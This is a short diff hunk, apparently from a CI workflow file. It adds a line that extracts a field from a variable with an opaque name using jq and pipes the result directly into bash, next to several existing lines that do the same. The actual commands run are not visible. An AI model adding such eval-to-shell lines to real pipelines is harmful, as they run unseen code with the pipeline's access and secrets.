@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$qt013" | jq -r .r849 | /bin/bash
           echo $z4506 | jq -r .gn99 | /bin/bash
           echo $ydsj46070 | jq -r .kdp14335 | /bin/bash
+          echo $f4 | jq -r .zdyq9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
